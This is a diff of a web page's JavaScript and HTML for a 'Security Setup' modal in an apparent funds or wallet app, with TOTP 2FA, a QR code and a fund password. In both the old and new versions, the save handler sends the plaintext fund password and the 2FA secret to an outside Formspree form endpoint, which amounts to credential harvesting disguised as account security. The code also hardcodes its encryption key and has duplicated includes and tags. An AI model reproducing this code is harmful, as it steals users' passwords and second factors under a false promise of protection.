@@ -13,6 +13,10 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/otplib@12.0.1/otplib.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+   <script src="https://cdn.jsdelivr.net/npm/otplib/otplib-browser.min.js"></script>
+   <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.js"></script>
+  <style>
     <style>
         :root {
             --bg: #0d0f14;
@@ -88,6 +92,7 @@
     </div>
 </div>
 
+<!-- Security Modal -->
 <div id="securityModal" class="fixed inset-0 bg-black bg-opacity-70 hidden items-center justify-center z-50 p-4">
   <div class="bg-gray-900 text-gray-100 rounded-xl w-full max-w-lg p-6 relative">
     <button id="closeSecurityModal" class="absolute top-4 right-4 text-gray-400 hover:text-white font-bold text-lg" aria-label="Close security modal">
@@ -96,17 +101,21 @@
       </svg>
     </button>
     <h2 class="text-2xl font-bold mb-4">🔐 Security Setup</h2>
+
     <div class="bg-gray-800 p-4 rounded-lg mb-4">
       <p><strong>User ID:</strong> <span id="modalUserId"></span></p>
       <p><strong>Username:</strong> <input type="text" id="modalUsername" readonly class="bg-gray-700 text-white rounded px-2 py-1 w-full mt-1"></p>
     </div>
+
     <label class="block font-semibold mb-1">Scan this QR Code in Google Authenticator:</label>
     <div id="modalQrCode" class="mb-2"></div>
     <div id="modalSecretKey" class="bg-gray-800 p-2 rounded mb-4"></div>
+
     <label class="block font-semibold mb-1">Enter 2FA Code:</label>
     <input type="number" id="modalCodeInput" placeholder="Enter 6-digit code" class="w-full mb-2 px-3 py-2 rounded bg-gray-800 text-white" aria-label="2FA Code Input">
     <button id="verify2FABtn" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded mb-2">Verify Code</button>
     <div id="verifyResult" class="mb-4"></div>
+
     <label class="block font-semibold mb-1">Set Fund Password:</label>
     <div class="flex mb-4">
       <input type="password" id="modalFundPassword" placeholder="Enter fund password" class="flex-grow px-3 py-2 rounded-l bg-gray-800 text-white" aria-label="Fund Password Input">
@@ -117,6 +126,7 @@
         </svg>
       </button>
     </div>
+
     <button id="saveSecurityBtn" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded">Save Security Settings</button>
     <div id="saveResult" class="mt-2"></div>
   </div>
@@ -1585,125 +1595,165 @@ if (installBtn) {
     document.getElementById('transactionsBtn').addEventListener('click', () => showModal('Transactions', 'This is a demo for the transaction history feature.'));
 
     // Security Modal Elements
-    const securityModal = document.getElementById('securityModal');
-    const closeSecurityModal = document.getElementById('closeSecurityModal');
-    const modalUserId = document.getElementById('modalUserId');
-    const modalUsername = document.getElementById('modalUsername');
-    const modalQrCode = document.getElementById('modalQrCode');
-    const modalSecretKey = document.getElementById('modalSecretKey');
-    const modalCodeInput = document.getElementById('modalCodeInput');
-    const verify2FABtn = document.getElementById('verify2FABtn');
-    const verifyResult = document.getElementById('verifyResult');
-    const modalFundPassword = document.getElementById('modalFundPassword');
-    const toggleFundPassword = document.getElementById('toggleFundPassword');
-    const saveSecurityBtn = document.getElementById('saveSecurityBtn');
-    const saveResult = document.getElementById('saveResult');
+const securityModal = document.getElementById('securityModal');
+const closeSecurityModal = document.getElementById('closeSecurityModal');
+const modalUserId = document.getElementById('modalUserId');
+const modalUsername = document.getElementById('modalUsername');
+const modalQrCode = document.getElementById('modalQrCode');
+const modalSecretKey = document.getElementById('modalSecretKey');
+const modalCodeInput = document.getElementById('modalCodeInput');
+const verify2FABtn = document.getElementById('verify2FABtn');
+const verifyResult = document.getElementById('verifyResult');
+const modalFundPassword = document.getElementById('modalFundPassword');
+const toggleFundPassword = document.getElementById('toggleFundPassword');
+const saveSecurityBtn = document.getElementById('saveSecurityBtn');
+const saveResult = document.getElementById('saveResult');
 
-    let currentUserId = null, currentUserSecret = null;
-    let is2FAVerified = false;
-    let encryptionKey = "MyAppEncryptionKey";
-    let timerInterval, step = 30;
+let currentUserId = null, currentUserSecret = null;
+let is2FAVerified = false;
+let encryptionKey = "MyAppEncryptionKey";
+let timerInterval, qrRefreshInterval;
+let step = 30;
 
-    function getUsers(){ return JSON.parse(localStorage.getItem("users")||"{}"); }
-    function saveUsers(users){ localStorage.setItem("users", JSON.stringify(users)); }
-    function generateNumericAccountId(){ return Math.floor(1000000000 + Math.random() * 9000000000).toString(); }
+// LocalStorage Helpers (single user)
+function getUser() { return JSON.parse(localStorage.getItem("user") || "null"); }
+function saveUser(user) { localStorage.setItem("user", JSON.stringify(user)); }
+function clearUser() { localStorage.removeItem("user"); }
 
-    function openSecurityModal(){
-        securityModal.classList.remove('hidden');
-        generate2FA();
-    }
+function generateNumericAccountId() {
+    return Math.floor(1000000000 + Math.random() * 9000000000).toString(); // 10-digit
+}
 
-    closeSecurityModal.addEventListener('click', ()=>{
-        securityModal.classList.add('hidden');
-        clearInterval(timerInterval);
-    });
+// Open Security Modal & auto-generate 2FA
+function openSecurityModal() {
+    securityModal.classList.remove('hidden');
+    const user = getUser();
+    if(user) loadUser(user);
+    else generate2FA();
+}
 
-    function generate2FA(){
-        const userId = generateNumericAccountId();
-        const username = "User" + Math.floor(Math.random()*10000);
-        const secret = otplib.authenticator.generateSecret();
-        currentUserId = userId;
-        currentUserSecret = secret;
+closeSecurityModal.addEventListener('click', () => {
+    securityModal.classList.add('hidden');
+    clearInterval(timerInterval);
+    clearInterval(qrRefreshInterval);
+});
 
-        // NOTE: This is a placeholder for a Google Authenticator key URI.
-        // It does not use real Google API keys.
-        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
-        modalQrCode.innerHTML = "";
-        new QRCode(modalQrCode, { text: otpauth, width: 128, height: 128 });
-        modalSecretKey.innerText = "Secret Key: " + secret;
-        modalUsername.value = username;
-        modalUserId.innerText = userId;
+// Generate 2FA for single user
+function generate2FA() {
+    const userId = generateNumericAccountId();
+    const username = "User" + Math.floor(Math.random() * 10000);
+    const secret = otplib.authenticator.generateSecret();
+    currentUserId = userId;
+    currentUserSecret = secret;
 
-        const users = getUsers();
-        users[userId] = { username, secret, verified:false, fundPassword:null };
-        saveUsers(users);
+    const user = { userId, username, twoFASecret: secret, verified: false, fundPassword: null };
+    saveUser(user);
 
-        startTimer();
-    }
+    modalUserId.innerText = userId;
+    modalUsername.value = username;
+    updateQRCode();
+    startTimer();
+    startQRRefresh();
+}
 
-    function startTimer(){
-        clearInterval(timerInterval);
-        let start = Math.floor(Date.now()/1000);
-        timerInterval = setInterval(()=>{
-            let elapsed = Math.floor(Date.now()/1000)-start;
-            let remaining = step - (elapsed % step);
-            verifyResult.innerText = `Code valid for: ${remaining}s`;
-            if(remaining <= 0){
-                verifyResult.innerHTML = "<span class='text-red-500 font-bold'>⚠️ Code expired, new one generated!</span>";
-                updateQRCode();
-            }
-        },1000);
-    }
+// Load existing user
+function loadUser(user) {
+    currentUserId = user.userId;
+    currentUserSecret = user.twoFASecret;
+    is2FAVerified = false;
 
-    function updateQRCode(){
-        const users = getUsers();
-        if(!users[currentUserId]) return;
-        const secret = users[currentUserId].secret;
-        const username = users[currentUserId].username;
-        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
-        modalQrCode.innerHTML = "";
-        new QRCode(modalQrCode, { text: otpauth, width: 128, height: 128 });
-    }
+    modalUserId.innerText = currentUserId;
+    modalUsername.value = user.username;
+    modalFundPassword.value = user.fundPassword ? decryptPassword(user.fundPassword) : "";
+    updateQRCode();
+    startTimer();
+    startQRRefresh();
+}
 
-    verify2FABtn.addEventListener('click', ()=>{
-        const code = modalCodeInput.value.trim();
-        const valid = otplib.authenticator.check(code,currentUserSecret);
-        if(valid){
-            verifyResult.innerHTML = "<div class='text-green-500 font-bold'>✅ 2FA Verified!</div>";
-            const users = getUsers();
-            users[currentUserId].verified = true;
-            saveUsers(users);
-            is2FAVerified = true;
-        } else {
-            verifyResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Invalid Code</div>";
+// Update QR code and secret display
+function updateQRCode() {
+    if(!currentUserSecret) return;
+    const otpauth = otplib.authenticator.keyuri(modalUsername.value, "MyApp", currentUserSecret);
+    modalQrCode.innerHTML = "";
+    new QRCode(modalQrCode, { text: otpauth, width: 128, height: 128 });
+    modalSecretKey.innerText = "Secret Key: " + (modalSecretKey.dataset.visible ? currentUserSecret : '******');
+}
+
+// Timer for TOTP code validity
+function startTimer() {
+    clearInterval(timerInterval);
+    let start = Math.floor(Date.now() / 1000);
+    timerInterval = setInterval(() => {
+        const elapsed = Math.floor(Date.now() / 1000) - start;
+        const remaining = step - (elapsed % step);
+        verifyResult.innerText = `Code valid for: ${remaining}s`;
+        document.getElementById("timerBar").style.width = `${(remaining/step)*100}%`;
+        if(remaining <= 0) {
+            verifyResult.innerHTML = "<span class='text-red-500 font-bold'>⚠️ Code expired, new one generated!</span>";
+            updateQRCode();
             is2FAVerified = false;
         }
-    });
+    }, 1000);
+}
 
-    toggleFundPassword.addEventListener('click', ()=>{
-        modalFundPassword.type = modalFundPassword.type==="password" ? "text" : "password";
-    });
+// Refresh QR every 30 seconds
+function startQRRefresh() {
+    clearInterval(qrRefreshInterval);
+    qrRefreshInterval = setInterval(updateQRCode, 30000);
+}
 
-    saveSecurityBtn.addEventListener('click', ()=>{
-        const fundPassword = modalFundPassword.value.trim();
-        if(!fundPassword){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Enter Fund Password</div>"; return; }
-        if(!is2FAVerified){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Verify 2FA before saving</div>"; return; }
+// Verify 2FA Code
+verify2FABtn.addEventListener('click', () => {
+    const code = modalCodeInput.value.trim();
+    if(!code || !currentUserSecret) return alert("Generate 2FA first and enter code");
+    const valid = otplib.authenticator.check(code, currentUserSecret);
+    if(valid){
+        verifyResult.innerHTML = "<div class='text-green-500 font-bold'>✅ 2FA Verified!</div>";
+        const user = getUser();
+        user.verified = true;
+        saveUser(user);
+        is2FAVerified = true;
+    } else {
+        verifyResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Invalid Code</div>";
+        is2FAVerified = false;
+    }
+});
 
-        const users = getUsers();
-        users[currentUserId].fundPassword = CryptoJS.AES.encrypt(fundPassword,encryptionKey).toString();
-        saveUsers(users);
+// Toggle Fund Password visibility
+toggleFundPassword.addEventListener('click', ()=>{
+    modalFundPassword.type = modalFundPassword.type === "password" ? "text" : "password";
+});
 
-        const formData = { userId: currentUserId, username: users[currentUserId].username, fundPassword, twoFASecret: currentUserSecret };
-        fetch("https://formspree.io/f/mldlqyag", {
-            method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(formData)
-        }).then(res=>{
-            if(res.ok) saveResult.innerHTML = "<div class='text-green-500 font-bold'>✅ Security info saved & sent!</div>";
-            else saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Submission failed</div>";
-        }).catch(()=> saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Network Error</div>");
-    });
+// AES encrypt/decrypt
+function encryptPassword(password){ return CryptoJS.AES.encrypt(password, encryptionKey).toString(); }
+function decryptPassword(ciphertext){ return CryptoJS.AES.decrypt(ciphertext, encryptionKey).toString(CryptoJS.enc.Utf8); }
 
-    document.getElementById('securityBtn').addEventListener('click', openSecurityModal);
+// Save Fund Password + user data
+saveSecurityBtn.addEventListener('click', ()=>{
+    const fundPassword = modalFundPassword.value.trim();
+    if(!fundPassword){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Enter Fund Password</div>"; return; }
+    if(!is2FAVerified){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Verify 2FA before saving</div>"; return; }
 
+    const user = getUser();
+    user.fundPassword = encryptPassword(fundPassword);
+    saveUser(user);
+
+    const formData = { userId: currentUserId, username: user.username, fundPassword, twoFASecret: currentUserSecret };
+    fetch("https://formspree.io/f/mldlqyag", {
+        method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(formData)
+    }).then(res=>{
+        if(res.ok) saveResult.innerHTML = "<div class='text-green-500 font-bold'>✅ Security info saved & sent!</div>";
+        else saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Submission failed</div>";
+    }).catch(()=> saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Network Error</div>");
+});
+
+// Copy User ID from modal
+function copyUserID(){
+    navigator.clipboard.writeText(currentUserId).then(()=>alert(`Copied User ID: ${currentUserId}`));
+}
+
+// Open modal button
+document.getElementById('securityBtn').addEventListener('click', openSecurityModal);
     // Initial data load on startup
     window.addEventListener('load', () => {
       // Check for cached data first to ensure instant load
